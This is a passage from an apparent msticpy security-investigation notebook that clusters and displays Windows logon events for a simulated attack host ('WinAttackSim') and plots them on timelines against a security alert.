    "        nbdisplay.display_logon_data(logon_event, security_alert)\n",
    "else:\n",
    "    print('No account entity in the source alert or the primary account had no logonId value set.')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### All Host Logons\n",
    "Since the number of logon events may be large and, in the case of system logons, very repetitive, we use clustering to try to identity logons with unique characteristics.\n",
    "\n",
    "In this case we use the numeric score of the account name and the logon type (i.e. interactive, service, etc.). The results of the clustered logons are shown below along with a more detailed, readable printout of the logon event information. The data here will vary depending on whether this is a Windows or Linux host."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 155,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:54:32.299392Z",
     "start_time": "2019-10-31T22:54:28.783876Z"
    },
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "<p style=\"\">Number of input events:</p>"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "<p style=\"\">Number of clustered events:</p>"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "<p style=\"\">\n",
       "Distinct host logon patterns:</p>"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>TenantId</th>\n",
       "      <th>Account</th>\n",
       "      <th>EventID</th>\n",
       "      <th>TimeGenerated</th>\n",
       "      <th>SourceComputerId</th>\n",
       "      <th>Computer</th>\n",
       "      <th>SubjectUserName</th>\n",
       "      <th>SubjectDomainName</th>\n",
       "      <th>SubjectUserSid</th>\n",
       "      <th>TargetUserName</th>\n",
       "      <th>TargetDomainName</th>\n",
       "      <th>TargetUserSid</th>\n",
       "      <th>TargetLogonId</th>\n",
       "      <th>LogonProcessName</th>\n",
       "      <th>LogonType</th>\n",
       "      <th>AuthenticationPackageName</th>\n",
       "      <th>Status</th>\n",
       "      <th>IpAddress</th>\n",
       "      <th>WorkstationName</th>\n",
       "      <th>TimeCreatedUtc</th>\n",
       "      <th>AccountNum</th>\n",
       "      <th>LogonHour</th>\n",
       "      <th>Clustered</th>\n",
       "      <th>ClusterId</th>\n",
       "      <th>ClusterSize</th>\n",
       "      <th>FirstEventTime</th>\n",
       "      <th>LastEventTime</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>NT AUTHORITY\\SYSTEM</td>\n",
       "      <td>4624</td>\n",
       "      <td>2019-09-11 22:51:37.293</td>\n",
       "      <td>e72f40cd-a7d2-4a41-8562-3f32da204b36</td>\n",
       "      <td>WinAttackSim</td>\n",
       "      <td>WinAttackSim$</td>\n",
       "      <td>WORKGROUP</td>\n",
       "      <td>S-1-5-18</td>\n",
       "      <td>SYSTEM</td>\n",
       "      <td>NT AUTHORITY</td>\n",
       "      <td>S-1-5-18</td>\n",
       "      <td>0x3e7</td>\n",
       "      <td>Advapi</td>\n",
       "      <td>5</td>\n",
       "      <td>Negotiate</td>\n",
       "      <td></td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2019-09-12 21:36:42.550</td>\n",
       "      <td>1484</td>\n",
       "      <td>21</td>\n",
       "      <td>True</td>\n",
       "      <td>0</td>\n",
       "      <td>15</td>\n",
       "      <td>2019-09-11 22:51:37.293</td>\n",
       "      <td>2019-09-12 21:36:42.550</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>WinAttackSim\\AttackAdmin</td>\n",
       "      <td>4624</td>\n",
       "      <td>2019-09-11 23:00:34.263</td>\n",
       "      <td>e72f40cd-a7d2-4a41-8562-3f32da204b36</td>\n",
       "      <td>WinAttackSim</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>S-1-0-0</td>\n",
       "      <td>AttackAdmin</td>\n",
       "      <td>WinAttackSim</td>\n",
       "      <td>S-1-5-21-3355618666-3700345348-2252427328-500</td>\n",
       "      <td>0x3429210</td>\n",
       "      <td>NtLmSsp</td>\n",
       "      <td>3</td>\n",
       "      <td>NTLM</td>\n",
       "      <td></td>\n",
       "      <td>131.107.160.233</td>\n",
       "      <td>JULIANGO-HP2</td>\n",
       "      <td>2019-09-12 16:49:09.167</td>\n",
       "      <td>2380</td>\n",
       "      <td>16</td>\n",
       "      <td>True</td>\n",
       "      <td>1</td>\n",
       "      <td>4</td>\n",
       "      <td>2019-09-11 23:00:34.263</td>\n",
       "      <td>2019-09-12 16:49:10.803</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>WinAttackSim\\AttackAdmin</td>\n",
       "      <td>4624</td>\n",
       "      <td>2019-09-11 23:00:37.840</td>\n",
       "      <td>e72f40cd-a7d2-4a41-8562-3f32da204b36</td>\n",
       "      <td>WinAttackSim</td>\n",
       "      <td>WinAttackSim$</td>\n",
       "      <td>WORKGROUP</td>\n",
       "      <td>S-1-5-18</td>\n",
       "      <td>AttackAdmin</td>\n",
       "      <td>WinAttackSim</td>\n",
       "      <td>S-1-5-21-3355618666-3700345348-2252427328-500</td>\n",
       "      <td>0x342de3a</td>\n",
       "      <td>User32</td>\n",
       "      <td>7</td>\n",
       "      <td>Negotiate</td>\n",
       "      <td></td>\n",
       "      <td>131.107.160.233</td>\n",
       "      <td>WinAttackSim</td>\n",
       "      <td>2019-09-12 16:49:13.927</td>\n",
       "      <td>2380</td>\n",
       "      <td>16</td>\n",
       "      <td>False</td>\n",
       "      <td>-1</td>\n",
       "      <td>1</td>\n",
       "      <td>2019-09-11 23:00:37.840</td>\n",
       "      <td>2019-09-12 16:49:13.927</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>WinAttackSim\\AttackAdmin</td>\n",
       "      <td>4624</td>\n",
       "      <td>2019-09-11 23:00:37.840</td>\n",
       "      <td>e72f40cd-a7d2-4a41-8562-3f32da204b36</td>\n",
       "      <td>WinAttackSim</td>\n",
       "      <td>WinAttackSim$</td>\n",
       "      <td>WORKGROUP</td>\n",
       "      <td>S-1-5-18</td>\n",
       "      <td>AttackAdmin</td>\n",
       "      <td>WinAttackSim</td>\n",
       "      <td>S-1-5-21-3355618666-3700345348-2252427328-500</td>\n",
       "      <td>0x1caf88b</td>\n",
       "      <td>User32</td>\n",
       "      <td>10</td>\n",
       "      <td>Negotiate</td>\n",
       "      <td></td>\n",
       "      <td>131.107.160.233</td>\n",
       "      <td>WinAttackSim</td>\n",
       "      <td>2019-09-11 23:00:38.923</td>\n",
       "      <td>2380</td>\n",
       "      <td>23</td>\n",
       "      <td>False</td>\n",
       "      <td>-1</td>\n",
       "      <td>1</td>\n",
       "      <td>2019-09-11 23:00:37.840</td>\n",
       "      <td>2019-09-12 16:49:13.927</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>Font Driver Host\\UMFD-2</td>\n",
       "      <td>4624</td>\n",
       "      <td>2019-09-11 23:00:37.840</td>\n",
       "      <td>e72f40cd-a7d2-4a41-8562-3f32da204b36</td>\n",
       "      <td>WinAttackSim</td>\n",
       "      <td>WinAttackSim$</td>\n",
       "      <td>WORKGROUP</td>\n",
       "      <td>S-1-5-18</td>\n",
       "      <td>UMFD-2</td>\n",
       "      <td>Font Driver Host</td>\n",
       "      <td>S-1-5-96-0-2</td>\n",
       "      <td>0x1ca9c1d</td>\n",
       "      <td>Advapi</td>\n",
       "      <td>2</td>\n",
       "      <td>Negotiate</td>\n",
       "      <td></td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2019-09-11 23:00:37.840</td>\n",
       "      <td>1992</td>\n",
       "      <td>23</td>\n",
       "      <td>False</td>\n",
       "      <td>-1</td>\n",
       "      <td>1</td>\n",
       "      <td>2019-09-11 23:00:37.840</td>\n",
       "      <td>2019-09-12 16:49:13.927</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>16</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>Window Manager\\DWM-2</td>\n",
       "      <td>4624</td>\n",
       "      <td>2019-09-11 23:00:37.900</td>\n",
       "      <td>e72f40cd-a7d2-4a41-8562-3f32da204b36</td>\n",
       "      <td>WinAttackSim</td>\n",
       "      <td>WinAttackSim$</td>\n",
       "      <td>WORKGROUP</td>\n",
       "      <td>S-1-5-18</td>\n",
       "      <td>DWM-2</td>\n",
       "      <td>Window Manager</td>\n",
       "      <td>S-1-5-90-0-2</td>\n",
       "      <td>0x1ca9e8a</td>\n",
       "      <td>Advapi</td>\n",
       "      <td>2</td>\n",
       "      <td>Negotiate</td>\n",
       "      <td></td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2019-09-11 23:00:37.900</td>\n",
       "      <td>1782</td>\n",
       "      <td>23</td>\n",
       "      <td>True</td>\n",
       "      <td>2</td>\n",
       "      <td>2</td>\n",
       "      <td>2019-09-11 23:00:37.900</td>\n",
       "      <td>2019-09-11 23:00:37.900</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                TenantId                   Account  EventID  \\\n",
       "0   52b1ab41-869e-4138-9e40-2a4457f09bf0       NT AUTHORITY\\SYSTEM     4624   \n",
       "4   52b1ab41-869e-4138-9e40-2a4457f09bf0  WinAttackSim\\AttackAdmin     4624   \n",
       "6   52b1ab41-869e-4138-9e40-2a4457f09bf0  WinAttackSim\\AttackAdmin     4624   \n",
       "11  52b1ab41-869e-4138-9e40-2a4457f09bf0  WinAttackSim\\AttackAdmin     4624   \n",
       "15  52b1ab41-869e-4138-9e40-2a4457f09bf0   Font Driver Host\\UMFD-2     4624   \n",
       "16  52b1ab41-869e-4138-9e40-2a4457f09bf0      Window Manager\\DWM-2     4624   \n",
       "\n",
       "             TimeGenerated                      SourceComputerId  \\\n",
       "0  2019-09-11 22:51:37.293  e72f40cd-a7d2-4a41-8562-3f32da204b36   \n",
       "4  2019-09-11 23:00:34.263  e72f40cd-a7d2-4a41-8562-3f32da204b36   \n",
       "6  2019-09-11 23:00:37.840  e72f40cd-a7d2-4a41-8562-3f32da204b36   \n",
       "11 2019-09-11 23:00:37.840  e72f40cd-a7d2-4a41-8562-3f32da204b36   \n",
       "15 2019-09-11 23:00:37.840  e72f40cd-a7d2-4a41-8562-3f32da204b36   \n",
       "16 2019-09-11 23:00:37.900  e72f40cd-a7d2-4a41-8562-3f32da204b36   \n",
       "\n",
       "        Computer SubjectUserName SubjectDomainName SubjectUserSid  \\\n",
       "0   WinAttackSim   WinAttackSim$         WORKGROUP       S-1-5-18   \n",
       "4   WinAttackSim               -                 -        S-1-0-0   \n",
       "6   WinAttackSim   WinAttackSim$         WORKGROUP       S-1-5-18   \n",
       "11  WinAttackSim   WinAttackSim$         WORKGROUP       S-1-5-18   \n",
       "15  WinAttackSim   WinAttackSim$         WORKGROUP       S-1-5-18   \n",
       "16  WinAttackSim   WinAttackSim$         WORKGROUP       S-1-5-18   \n",
       "\n",
       "   TargetUserName  TargetDomainName  \\\n",
       "0          SYSTEM      NT AUTHORITY   \n",
       "4     AttackAdmin      WinAttackSim   \n",
       "6     AttackAdmin      WinAttackSim   \n",
       "11    AttackAdmin      WinAttackSim   \n",
       "15         UMFD-2  Font Driver Host   \n",
       "16          DWM-2    Window Manager   \n",
       "\n",
       "                                    TargetUserSid TargetLogonId  \\\n",
       "0                                        S-1-5-18         0x3e7   \n",
       "4   S-1-5-21-3355618666-3700345348-2252427328-500     0x3429210   \n",
       "6   S-1-5-21-3355618666-3700345348-2252427328-500     0x342de3a   \n",
       "11  S-1-5-21-3355618666-3700345348-2252427328-500     0x1caf88b   \n",
       "15                                   S-1-5-96-0-2     0x1ca9c1d   \n",
       "16                                   S-1-5-90-0-2     0x1ca9e8a   \n",
       "\n",
       "   LogonProcessName  LogonType AuthenticationPackageName Status  \\\n",
       "0          Advapi            5                 Negotiate          \n",
       "4          NtLmSsp           3                      NTLM          \n",
       "6           User32           7                 Negotiate          \n",
       "11          User32          10                 Negotiate          \n",
       "15         Advapi            2                 Negotiate          \n",
       "16         Advapi            2                 Negotiate          \n",
       "\n",
       "          IpAddress WorkstationName          TimeCreatedUtc  AccountNum  \\\n",
       "0                 -               - 2019-09-12 21:36:42.550        1484   \n",
       "4   131.107.160.233    JULIANGO-HP2 2019-09-12 16:49:09.167        2380   \n",
       "6   131.107.160.233    WinAttackSim 2019-09-12 16:49:13.927        2380   \n",
       "11  131.107.160.233    WinAttackSim 2019-09-11 23:00:38.923        2380   \n",
       "15                -               - 2019-09-11 23:00:37.840        1992   \n",
       "16                -               - 2019-09-11 23:00:37.900        1782   \n",
       "\n",
       "    LogonHour  Clustered  ClusterId  ClusterSize          FirstEventTime  \\\n",
       "0          21       True          0           15 2019-09-11 22:51:37.293   \n",
       "4          16       True          1            4 2019-09-11 23:00:34.263   \n",
       "6          16      False         -1            1 2019-09-11 23:00:37.840   \n",
       "11         23      False         -1            1 2019-09-11 23:00:37.840   \n",
       "15         23      False         -1            1 2019-09-11 23:00:37.840   \n",
       "16         23       True          2            2 2019-09-11 23:00:37.900   \n",
       "\n",
       "             LastEventTime  \n",
       "0  2019-09-12 21:36:42.550  \n",
       "4  2019-09-12 16:49:10.803  \n",
       "6  2019-09-12 16:49:13.927  \n",
       "11 2019-09-12 16:49:13.927  \n",
       "15 2019-09-12 16:49:13.927  \n",
       "16 2019-09-11 23:00:37.900  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from msticpy.sectools.eventcluster import dbcluster_events, add_process_features, _string_score\n",
    "\n",
    "if security_alert.primary_host:\n",
    "    host_logons = qry_prov.WindowsSecurity.list_host_logons(query_times, security_alert,host_name=security_alert.ExtendedProperties['Compromised Host'])\n",
    "else:\n",
    "    host_logons = None\n",
    "    md(\"No data available - alert has no host entity.\")\n",
    "    \n",
    "if host_logons is not None and not host_logons.empty:\n",
    "    logon_features = host_logons.copy()\n",
    "    logon_features['AccountNum'] = host_logons.apply(lambda x: _string_score(x.Account), axis=1)\n",
    "    logon_features['LogonHour'] = host_logons.apply(lambda x: x.TimeGenerated.hour, axis=1)\n",
    "\n",
    "    # you might need to play around with the max_cluster_distance parameter.\n",
    "    # decreasing this gives more clusters.\n",
    "    (clus_logons, _, _) = dbcluster_events(data=logon_features, time_column='TimeGenerated',\n",
    "                                           cluster_columns=['AccountNum',\n",
    "                                                            'LogonType'],\n",
    "                                                             max_cluster_distance=0.0001)\n",
    "    md('Number of input events:', len(host_logons))\n",
    "    md('Number of clustered events:', len(clus_logons))\n",
    "    md('\\nDistinct host logon patterns:')\n",
    "    display(clus_logons.sort_values('TimeGenerated'))\n",
    "else:\n",
    "    md('No logon events found for host.', styles=[\"bold\",\"red\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 157,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:54:45.032272Z",
     "start_time": "2019-10-31T22:54:44.956033Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "### Account Logon\n",
      "Account:  AttackAdmin\n",
      "Account Domain:  WinAttackSim\n",
      "Logon Time:  2019-09-11 23:00:37.840000\n",
      "Logon type: 7  (Unlock)\n",
      "User Id/SID:  S-1-5-21-3355618666-3700345348-2252427328-500\n",
      "    SID S-1-5-21-3355618666-3700345348-2252427328-500 is administrator\n",
      "    SID S-1-5-21-3355618666-3700345348-2252427328-500 is local machine or domain account\n",
      "Session id '0x342de3a'  \n",
      "Subject (source) account:  WORKGROUP/WinAttackSim$\n",
      "Logon process:  User32 \n",
      "Authentication:  Negotiate\n",
      "Source IpAddress:  131.107.160.233\n",
      "Source Host:  WinAttackSim\n",
      "Logon status:  \n",
      "\n",
      "### Account Logon\n",
      "Account:  AttackAdmin\n",
      "Account Domain:  WinAttackSim\n",
      "Logon Time:  2019-09-11 23:00:37.840000\n",
      "Logon type: 10  (RemoteInteractive)\n",
      "User Id/SID:  S-1-5-21-3355618666-3700345348-2252427328-500\n",
      "    SID S-1-5-21-3355618666-3700345348-2252427328-500 is administrator\n",
      "    SID S-1-5-21-3355618666-3700345348-2252427328-500 is local machine or domain account\n",
      "Session id '0x1caf88b'  \n",
      "Subject (source) account:  WORKGROUP/WinAttackSim$\n",
      "Logon process:  User32 \n",
      "Authentication:  Negotiate\n",
      "Source IpAddress:  131.107.160.233\n",
      "Source Host:  WinAttackSim\n",
      "Logon status:  \n",
      "\n",
      "### Account Logon\n",
      "Account:  UMFD-2\n",
      "Account Domain:  Font Driver Host\n",
      "Logon Time:  2019-09-11 23:00:37.840000\n",
      "Logon type: 2  (Interactive)\n",
      "User Id/SID:  S-1-5-96-0-2\n",
      "Session id '0x1ca9c1d'  \n",
      "Subject (source) account:  WORKGROUP/WinAttackSim$\n",
      "Logon process:  Advapi  \n",
      "Authentication:  Negotiate\n",
      "Source IpAddress:  -\n",
      "Source Host:  -\n",
      "Logon status:  \n",
      "\n",
      "### Account Logon\n",
      "Account:  SYSTEM\n",
      "Account Domain:  NT AUTHORITY\n",
      "Logon Time:  2019-09-11 22:51:37.293000\n",
      "Logon type: 5  (Service)\n",
      "User Id/SID:  S-1-5-18\n",
      "    SID S-1-5-18 is LOCAL_SYSTEM\n",
      "Session id '0x3e7'  System logon session\n",
      "\n",
      "Subject (source) account:  WORKGROUP/WinAttackSim$\n",
      "Logon process:  Advapi  \n",
      "Authentication:  Negotiate\n",
      "Source IpAddress:  -\n",
      "Source Host:  -\n",
      "Logon status:  \n",
      "\n",
      "### Account Logon\n",
      "Account:  AttackAdmin\n",
      "Account Domain:  WinAttackSim\n",
      "Logon Time:  2019-09-11 23:00:34.263000\n",
      "Logon type: 3  (Network)\n",
      "User Id/SID:  S-1-5-21-3355618666-3700345348-2252427328-500\n",
      "    SID S-1-5-21-3355618666-3700345348-2252427328-500 is administrator\n",
      "    SID S-1-5-21-3355618666-3700345348-2252427328-500 is local machine or domain account\n",
      "Session id '0x3429210'  \n",
      "Subject (source) account:  -/-\n",
      "Logon process:  NtLmSsp \n",
      "Authentication:  NTLM\n",
      "Source IpAddress:  131.107.160.233\n",
      "Source Host:  JULIANGO-HP2\n",
      "Logon status:  \n",
      "\n",
      "### Account Logon\n",
      "Account:  DWM-2\n",
      "Account Domain:  Window Manager\n",
      "Logon Time:  2019-09-11 23:00:37.900000\n",
      "Logon type: 2  (Interactive)\n",
      "User Id/SID:  S-1-5-90-0-2\n",
      "Session id '0x1ca9e8a'  \n",
      "Subject (source) account:  WORKGROUP/WinAttackSim$\n",
      "Logon process:  Advapi  \n",
      "Authentication:  Negotiate\n",
      "Source IpAddress:  -\n",
      "Source Host:  -\n",
      "Logon status:  \n",
      "\n"
     ]
    }
   ],
   "source": [
    "# Display logon details\n",
    "if host_logons is not None:\n",
    "    nbdisplay.display_logon_data(clus_logons, security_alert)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Comparing All Logons with Clustered results relative to Alert time line\n",
    "To understand these logons in relation to the original alert we are investigating we want to view them in a time line."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 158,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:54:51.573254Z",
     "start_time": "2019-10-31T22:54:51.218843Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <div class=\"bk-root\">\n",
       "        <a class=\"bk-logo bk-logo-small bk-logo-notebook\"></a>\n",
       "        <span>Loading BokehJS ...</span>\n",
       "    </div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {},
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "  <div class=\"bk-root\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {},
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "2086"
      }
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Show timeline of events - all logons + clustered logons\n",
    "if host_logons is not None and not host_logons.empty:\n",
    "    nbdisplay.display_timeline(data=host_logons, overlay_data=clus_logons,\n",
    "                             alert=security_alert, \n",
    "                             source_columns=['Account', 'LogonType'],\n",
    "                             title='All Host Logons')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### View Process Session and Logon Events in Timelines\n",
    "This shows the timeline of the clustered logon events with the process tree obtained earlier. This allows you to get a sense of which logon was responsible for the process tree session whether any additional logons (e.g. creating a process as another user) might be associated with the alert timeline.\n",
    "\n",
    "*Note you should use the pan and zoom tools to align the timelines since the data may be over different time ranges.*"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 159,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:54:55.774353Z",
     "start_time": "2019-10-31T22:54:55.663496Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>TenantId</th>\n",
       "      <th>Account</th>\n",
       "      <th>EventID</th>\n",
       "      <th>TimeGenerated</th>\n",
       "      <th>SourceComputerId</th>\n",
       "      <th>Computer</th>\n",
       "      <th>SubjectUserName</th>\n",
       "      <th>SubjectDomainName</th>\n",
       "      <th>SubjectUserSid</th>\n",
       "      <th>TargetUserName</th>\n",
       "      <th>TargetDomainName</th>\n",
       "      <th>TargetUserSid</th>\n",
       "      <th>TargetLogonId</th>\n",
       "      <th>LogonProcessName</th>\n",
       "      <th>LogonType</th>\n",
       "      <th>AuthenticationPackageName</th>\n",
       "      <th>Status</th>\n",
       "      <th>IpAddress</th>\n",
       "      <th>WorkstationName</th>\n",
       "      <th>TimeCreatedUtc</th>\n",
       "      <th>AccountNum</th>\n",
       "      <th>LogonHour</th>\n",
       "      <th>Clustered</th>\n",
       "      <th>ClusterId</th>\n",
       "      <th>ClusterSize</th>\n",
       "      <th>FirstEventTime</th>\n",
       "      <th>LastEventTime</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>WinAttackSim\\AttackAdmin</td>\n",
       "      <td>4624</td>\n",
       "      <td>2019-09-11 23:00:37.840</td>\n",
       "      <td>e72f40cd-a7d2-4a41-8562-3f32da204b36</td>\n",
       "      <td>WinAttackSim</td>\n",
       "      <td>WinAttackSim$</td>\n",
       "      <td>WORKGROUP</td>\n",
       "      <td>S-1-5-18</td>\n",
       "      <td>AttackAdmin</td>\n",
       "      <td>WinAttackSim</td>\n",
       "      <td>S-1-5-21-3355618666-3700345348-2252427328-500</td>\n",
       "      <td>0x342de3a</td>\n",
       "      <td>User32</td>\n",
       "      <td>7</td>\n",
       "      <td>Negotiate</td>\n",
       "      <td></td>\n",
       "      <td>131.107.160.233</td>\n",
       "      <td>WinAttackSim</td>\n",
       "      <td>2019-09-12 16:49:13.927</td>\n",
       "      <td>2380</td>\n",
       "      <td>16</td>\n",
       "      <td>False</td>\n",
       "      <td>-1</td>\n",
       "      <td>1</td>\n",
       "      <td>2019-09-11 23:00:37.840</td>\n",
       "      <td>2019-09-12 16:49:13.927</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>WinAttackSim\\AttackAdmin</td>\n",
       "      <td>4624</td>\n",
       "      <td>2019-09-11 23:00:37.840</td>\n",
       "      <td>e72f40cd-a7d2-4a41-8562-3f32da204b36</td>\n",
       "      <td>WinAttackSim</td>\n",
       "      <td>WinAttackSim$</td>\n",
       "      <td>WORKGROUP</td>\n",
       "      <td>S-1-5-18</td>\n",
       "      <td>AttackAdmin</td>\n",
       "      <td>WinAttackSim</td>\n",
       "      <td>S-1-5-21-3355618666-3700345348-2252427328-500</td>\n",
       "      <td>0x1caf88b</td>\n",
       "      <td>User32</td>\n",
       "      <td>10</td>\n",
       "      <td>Negotiate</td>\n",
       "      <td></td>\n",
       "      <td>131.107.160.233</td>\n",
       "      <td>WinAttackSim</td>\n",
       "      <td>2019-09-11 23:00:38.923</td>\n",
       "      <td>2380</td>\n",
       "      <td>23</td>\n",
       "      <td>False</td>\n",
       "      <td>-1</td>\n",
       "      <td>1</td>\n",
       "      <td>2019-09-11 23:00:37.840</td>\n",
       "      <td>2019-09-12 16:49:13.927</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>Font Driver Host\\UMFD-2</td>\n",
       "      <td>4624</td>\n",
       "      <td>2019-09-11 23:00:37.840</td>\n",
       "      <td>e72f40cd-a7d2-4a41-8562-3f32da204b36</td>\n",
       "      <td>WinAttackSim</td>\n",
       "      <td>WinAttackSim$</td>\n",
       "      <td>WORKGROUP</td>\n",
       "      <td>S-1-5-18</td>\n",
       "      <td>UMFD-2</td>\n",
       "      <td>Font Driver Host</td>\n",
       "      <td>S-1-5-96-0-2</td>\n",
       "      <td>0x1ca9c1d</td>\n",
       "      <td>Advapi</td>\n",
       "      <td>2</td>\n",
       "      <td>Negotiate</td>\n",
       "      <td></td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2019-09-11 23:00:37.840</td>\n",
       "      <td>1992</td>\n",
       "      <td>23</td>\n",
       "      <td>False</td>\n",
       "      <td>-1</td>\n",
       "      <td>1</td>\n",
       "      <td>2019-09-11 23:00:37.840</td>\n",
       "      <td>2019-09-12 16:49:13.927</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>NT AUTHORITY\\SYSTEM</td>\n",
       "      <td>4624</td>\n",
       "      <td>2019-09-11 22:51:37.293</td>\n",
       "      <td>e72f40cd-a7d2-4a41-8562-3f32da204b36</td>\n",
       "      <td>WinAttackSim</td>\n",
       "      <td>WinAttackSim$</td>\n",
       "      <td>WORKGROUP</td>\n",
       "      <td>S-1-5-18</td>\n",
       "      <td>SYSTEM</td>\n",
       "      <td>NT AUTHORITY</td>\n",
       "      <td>S-1-5-18</td>\n",
       "      <td>0x3e7</td>\n",
       "      <td>Advapi</td>\n",
       "      <td>5</td>\n",
       "      <td>Negotiate</td>\n",
       "      <td></td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2019-09-12 21:36:42.550</td>\n",
       "      <td>1484</td>\n",
       "      <td>21</td>\n",
       "      <td>True</td>\n",
       "      <td>0</td>\n",
       "      <td>15</td>\n",
       "      <td>2019-09-11 22:51:37.293</td>\n",
       "      <td>2019-09-12 21:36:42.550</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>WinAttackSim\\AttackAdmin</td>\n",
       "      <td>4624</td>\n",
       "      <td>2019-09-11 23:00:34.263</td>\n",
       "      <td>e72f40cd-a7d2-4a41-8562-3f32da204b36</td>\n",
       "      <td>WinAttackSim</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>S-1-0-0</td>\n",
       "      <td>AttackAdmin</td>\n",
       "      <td>WinAttackSim</td>\n",
       "      <td>S-1-5-21-3355618666-3700345348-2252427328-500</td>\n",
       "      <td>0x3429210</td>\n",
       "      <td>NtLmSsp</td>\n",
       "      <td>3</td>\n",
       "      <td>NTLM</td>\n",
       "      <td></td>\n",
       "      <td>131.107.160.233</td>\n",
       "      <td>JULIANGO-HP2</td>\n",
       "      <td>2019-09-12 16:49:09.167</td>\n",
       "      <td>2380</td>\n",
       "      <td>16</td>\n",
       "      <td>True</td>\n",
       "      <td>1</td>\n",
       "      <td>4</td>\n",
       "      <td>2019-09-11 23:00:34.263</td>\n",
       "      <td>2019-09-12 16:49:10.803</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                TenantId                   Account  EventID  \\\n",
